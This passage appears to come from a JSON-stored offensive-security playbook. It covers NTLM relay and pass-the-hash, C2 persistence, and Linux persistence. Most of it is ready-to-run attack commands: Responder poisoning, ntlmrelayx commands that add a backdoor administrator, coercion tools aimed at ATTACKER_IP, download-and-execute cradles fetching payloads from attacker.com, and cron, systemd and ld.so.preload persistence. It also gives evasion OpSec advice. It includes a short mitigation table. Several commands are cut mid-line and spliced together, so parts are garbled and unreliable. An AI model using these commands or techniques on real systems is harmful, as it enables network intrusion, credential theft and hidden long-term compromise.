smb2-security-mode -p 445 192.168.1.0/24\n# \"Message signing enabled but not required\" → RELAYABLE\n# \"Message signing enabled and required\" → NOT relayable (DC default)\n\n# CrackMapExec\ncme smb 192.168.1.0/24 --gen-relay-list relay_targets.txt\n# Outputs all hosts where signing is not required\n```\n\n---\n\n## Responder: Capture NTLM Hashes\n\nResponder poisons LLMNR, NBT-NS, and MDNS to capture NTLM hashes:\n\n```bash\n# Install\ngit clone https://github.com/lgandx/Responder\n\n# Run Responder (capture hashes but don't relay — disable SMB/HTTP servers for relay)\nsudo python3 Responder.py -I eth0 -wFbv\n\n# For relay attack: disable SMB and HTTP servers in Responder\n# Edit Responder.conf: SMB = Off, HTTP = Off\nsudo python3 Responder.py -I eth0 -wFbv\n# Then run ntlmrelayx on the side\n```\n\n```\nResponder captures:\n- LLMNR queries: \"Who is FILESERVER?\" → Responder: \"I am!\" → victim authenticates\n- NBT-NS (NetBIOS Name Service): legacy name resolution\n- MDNS: Multicast DNS\n- WPAD: Web Proxy Auto-Discovery (very effective)\nHashes saved to: /usr/share/responder/logs/\n```\n\n---\n\n## ntlmrelayx (Impacket)\n\nThe primary relay tool — can relay to SMB, LDAP, LDAPS, MSSQL, HTTP, and more:\n\n```bash\n# Relay to SMB — execute command on target\nimpacket-ntlmrelayx -tf relay_targets.txt -smb2support -c \"net user hacker P@ss123! /add && net localgroup administrators hacker /add\"\n\n# Relay to SMB — interactive shell\nimpacket-ntlmrelayx -tf relay_targets.txt -smb2support -i\n# Connect to shell: nc 127.0.0.1 11000\n\n# Relay to LDAP — dump domain info\nimpacket-ntlmrelayx -t ldap://192.168.1.10 --no-http-server --no-smb-server\n\n# Relay to LDAPS — create new domain admin user\nimpacket-ntlmrelayx -t ldaps://192.168.1.10 --add-computer EVIL$ --escalate-user lowprivuser\n\n# Relay to LDAPS — shadow credentials (adds Key Credential to target account)\nimpacket-ntlmrelayx -t ldaps://192.168.1.10 --shadow-credentials --shadow-target targetuser\n\n# Relay to MSSQL — xp_cmdshell\nimpacket-ntlmrelayx -t mssql://192.168.1.20 --no-http-server -q \"EXEC ntlmv2.txt\n```\n\n---\n\n## Triggering NTLM Authentication (Coercion)\n\n```bash\n# PrinterBug (SpoolSample): coerce DC to authenticate to attacker\n# Requires: domain user, SMB access to DC\npython3 MS-DFSNM\npython3 dfscoerce.py -d corp.local -u user -p pass ATTACKER_IP dc01.corp.local\n\n# ShadowCoerce: via MS-FSRVP\npython3 shadowcoerce.py -d corp.local -u user -p pass ATTACKER_IP signing on DCs:\n\n```bash\n# Even if DC requires SMB signing, LDAP signing often not required\n# Relay SMB authentication to LDAP instead\n\nimpacket-ntlmrelayx -t ldap://dc01.corp.local \\\n --no-smb-server # keep HTTP server for WPAD-triggered auth\n# WPAD → victim authenticates to Responder HTTP → relay to LDAP\n# Result: domain info dump, or user creation with rights\n```\n\n---\n\n## Pass-the-Hash (PtH)\n\nOnce NTLM hash captured, use directly without cracking:\n\n```bash\n# CrackMapExec\ncme smb 192.168.1.0/24 -u Administrator -H NTLM_HASH\n\n# Impacket tools — all support Effect |\n|------------|--------|\n| Enable SMB signing (required) | Prevents SMB relay |\n| Enable LDAP signing + channel binding | Prevents LDAP relay |\n| Disable NTLM (use Kerberos only) | Eliminates NTLM relay |\n| Enable EPA (Extended Protection for Auth) | Prevents cross-protocol relay |\n| Disable LLMNR and NBT-NS | Prevents Responder poisoning |\n| Disable WPAD or use PAC file | Prevents WPAD-triggered auth |\n| Tier 0 isolation (DC auth separation) | Limits blast radius |", "last_updated": "2026-03-17"}, "c2-persistence": {"slug": "c2-persistence", "title": "C2 Persistence & Resilience", "category": "Persistence", "content": "# C2 Persistence & Resilience\n\nEnsuring reliable command-and-control communication survives network changes, infrastructure takedowns, and defender intervention.\n\n## Multiple Listener Redundancy\n\nDeploy implants with fallback listener configurations:\n\n```\nPrimary: HTTPS callback to https://cdn-assets.legitimate-site.com (domain fronted)\nSecondary: DNS callback to ns1.backup-domain.com (DNS C2)\nTertiary: SMB named pipe for peer-to-peer relay\nEmergency: Dead drop check every 24 hours via DNS TXT record\n```\n\nConfigure the implant to cycle through channels on primary failure, with exponential backoff. Each channel should use different infrastructure to avoid single points of failure.\n\n## Domain Fronting\n\nRoute C2 traffic through high-reputation CDNs by exploiting the difference between the TLS SNI and HTTP Host header:\n\n```\nTLS SNI: cdn.cloudflare.com (high reputation, never blocked)\nHTTP Host: c2.attacker-controlled.com (attacker's origin behind CDN)\n```\n\nThe network sees traffic to `cdn.cloudflare.com` but the CDN routes the request to the attacker's origin based on the Host header. Effective against SSL inspection that only checks SNI.\n\n**Note**: Many CDN providers have restricted domain fronting since 2018-2023. Test thoroughly before relying on this channel. CloudFront, Azure CDN, and Fastly have varying levels of enforcement.\n\n## Dead Drop Resolvers\n\nUse legitimate third-party services to publish C2 infrastructure addresses:\n\n```\n# DNS TXT record\ndig TXT update-check.attacker-domain.com\n# Returns base64-encoded C2 address\n\n# GitHub/GitLab\n# Commit a file with encoded C2 address to a public repo\n# Implant fetches raw file content via API\n\n# Pastebin/GitHub Gists\n# Publish encoded C2 config, implant polls periodically\n\n# Twitter/X\n# Post encoded C2 address in tweet, implant scrapes via API\n```\n\nDead drop resolvers allow changing C2 infrastructure without updating the implant. Even if the current C2 server is seized, the implant resolves the new address on next check-in.\n\n## Domain Generation Algorithms (DGA)\n\nImplant and server share an algorithm that generates predictable domain names:\n\n```\n# Algorithm: SHA-256(seed + date + index), consonant/vowel interleaving\n# Both sides generate the same domains for each day\n# Attacker registers a subset of generated domains\n\nDay 1: xelomati.com, bukanero.net, zipovade.org\nDay 2: malotrix.com, huverani.net, dopezami.org\n```\n\nDGA provides resilience against domain seizure — defenders must predict or reverse-engineer the algorithm and pre-register or sinkhole all possible domains.\n\n## P2P / Mesh Networking\n\nImplants communicate with each other, forming a resilient mesh:\n\n```\nInternet-facing implant (egress node) ←→ Internal implant A\n ←→ Internal implant B ←→ Internal implant C\n```\n\nIf the egress node is discovered, other implants can elect a new egress node. Communication between implants uses SMB named pipes, TCP, or WMI — all protocols common on internal networks.\n\n## Sleep and Jitter Configuration\n\n```\nBase sleep: 300 seconds (5 minutes)\nJitter: 30% (sleep varies 210-390 seconds)\nWorking hours: 08:00-18:00 target timezone only\nWeekend: Sleep 8 hours between check-ins\n```\n\nIrregular beaconing intervals prevent pattern-based detection. Working-hours-only activity blends with legitimate user traffic. Some frameworks support \"sleep until\" commands for extended dormancy.\n\n## Living-Off-the-Land C2\n\nUse built-in Windows tools as download cradles and execution engines:\n\n```cmd\n:: certutil download\ncertutil -urlcache -split -f http://attacker.com/payload.exe C:\\temp\\payload.exe\n\n:: bitsadmin\nbitsadmin /transfer job http://attacker.com/payload.exe C:\\temp\\payload.exe\n\n:: PowerShell\npowershell -ep bypass -c \"IEX(IWR http://attacker.com/stager.ps1)\"\n\n:: mshta\nmshta http://attacker.com/payload.hta\n\n:: regsvr32 (AppLocker bypass + download)\nregsvr32 /s /n /u /i:http://attacker.com/payload.sct scrobj.dll\n\n:: rundll32 with JavaScript\nrundll32.exe javascript:\"\\..\\mshtml,RunHTMLApplication \";GetObject(\"script:http://attacker.com/payload.sct\")\n```\n\n## Cloud Storage C2\n\nUse legitimate cloud APIs as C2 channels:\n\n```\n# Microsoft Graph API (OneDrive/SharePoint)\n# Implant reads commands from a OneDrive file\n# Writes results to a different file\n# Traffic appears as normal OneDrive sync\n\n# Dropbox API\n# Similar pattern — read commands, write results\n\n# Google Drive API\n# File-based C2 via Google Drive API\n\n# Slack/Discord/Telegram\n# Bot API for bidirectional communication\n# Blends with legitimate collaboration traffic\n```\n\n## Encrypted Callback Schedule\n\nImplant stores an encrypted schedule defining when to callback and to which listener:\n\n```\nMonday-Friday 08:00-18:00: HTTPS primary, 5-min intervals\nMonday-Friday 18:00-08:00: DNS secondary, 30-min intervals\nSaturday-Sunday: DNS tertiary, 2-hour intervals\nEmergency: Check dead drop every 6 hours regardless of schedule\n```\n\nSchedule is encrypted with a key derived from system-specific attributes, preventing analysis of captured implants from revealing the full C2 infrastructure.\n\n## Offline Mode with Task Queue\n\nWhen all C2 channels fail, the implant enters offline mode:\n\n1. Continue executing scheduled tasks (keylogging, credential harvesting)\n2. Queue results locally (encrypted, in-memory or hidden file)\n3. Attempt C2 reconnection with exponential backoff\n4. On reconnection, flush queued results to server\n5. Maximum offline duration before self-destruct (configurable)\n\n## Implant Self-Update\n\nThe C2 server can push updated implant code:\n\n1. Server sends new implant binary or shellcode via C2 channel\n2. Current implant verifies integrity (hash/signature)\n3. New implant is loaded reflectively in memory\n4. Old implant transfers state (keys, config, task queue) to new instance\n5. Old implant exits\n\nThis allows patching evasion techniques, adding new modules, and rotating signatures without re-deploying from initial access.\n\n## Redundant Persistence Layering\n\nDeploy multiple persistence mechanisms that reinstall each other:\n\n```\nPersistence A (Scheduled Task) checks for Persistence B\nPersistence B (WMI Subscription) checks for Persistence C\nPersistence C (COM Hijack) checks for Persistence A\n\nIf any one is removed, the others reinstall it on next trigger.\n```\n\n## Traffic Blending\n\nConfigure C2 traffic to mimic legitimate application patterns:\n\n```\n# Malleable profile matching OneDrive sync\nset sleeptime \"60000\";\nset jitter \"37\";\nset useragent \"Microsoft SkyDriveSync ...\";\nhttp-get {\n set uri \"/v1.0/me/drive/root/children\";\n header \"Accept\" \"application/json\";\n}\nhttp-post {\n set uri \"/v1.0/me/drive/items\";\n header \"Content-Type\" \"application/json\";\n}\n```\n\nMatch URI patterns, headers, request/response sizes, and timing to the legitimate application being mimicked. Test against threat intelligence platforms (VirusTotal, URLScan) to verify the profile passes inspection.\n\n## OpSec Notes\n\n- Domain fronting effectiveness varies by CDN provider and changes frequently\n- DGA domains can be predicted by defenders who reverse-engineer the algorithm — use strong seeds\n- Dead drop services may be monitored or taken down — diversify across platforms\n- Cloud API C2 requires OAuth tokens that expire — implement token refresh logic\n- P2P mesh traffic on unusual ports or protocols may trigger network anomaly detection\n- Self-update mechanisms must validate integrity to prevent defender-injected poisoned updates", "last_updated": "2026-03-12"}, "linux-persistence": {"slug": "linux-persistence", "title": "Linux Persistence Techniques", "category": "Persistence", "content": "# Linux Persistence Techniques\n\nMaintaining access to compromised Linux systems through legitimate system mechanisms and covert methods.\n\n## Cron Jobs\n\n```bash\n# User crontab\n(crontab -l 2>/dev/null; echo \"*/15 * * * * /tmp/.hidden/callback.sh\") | crontab -\n\n# System cron\necho \"*/15 * * * * root /opt/.svc/persist.sh\" >> /etc/cron.d/system-maintenance\n\n# Cron directories (daily/hourly/weekly)\ncp callback.sh /etc/cron.daily/system-update\nchmod +x /etc/cron.daily/system-update\n```\n\nName scripts to blend with legitimate system maintenance tasks. Avoid `/tmp` paths in system crons as `/tmp` may be mounted `noexec` or cleaned on boot.\n\n## Systemd Services and Timers\n\n**System-level** (requires root):\n```ini\n# Service\nAfter=network.target\n\n[Service]\nType=simple\nRestart=always\nRestartSec=60\nWorkingDirectory=/opt/.svc\nRuntimeMaxSec=infinity\n\n[Install]\nWantedBy=multi-user.target\n```\n\n```bash\nsystemctl daemon-reload\nsystemctl enable system-update.service\nsystemctl start system-update.service\n```\n\n**User-level** (no root needed):\n```bash\nmkdir -p ~/.config/systemd/user/\n# Create service file in ~/.config/systemd/user/\nsystemctl --user enable myservice.service\nsystemctl --user start myservice.service\n# Enable lingering so user services run without login\nloginctl enable-linger username\n```\n\n**Systemd timers** (cron alternative):\n```ini\n# log file\n# Place modified module in /lib/x86_64-linux-gnu/security/ or /lib64/security/\n```\n\nPAM persistence is extremely stealthy — no new files, no new processes. Survives password changes.\n\n## LD_PRELOAD / ld.so.preload\n\n```bash\n# /etc/ld.so.preload — loaded into every dynamically linked process\necho \"/opt/.lib/persist.so\" > /etc/ld.so.preload\n\n# The shared library hooks key functions (e.g., libc functions)\n# Can hide files, processes, network connections from standard tools\n# This is the basis of many userland rootkits\n```\n\n## Kernel Module
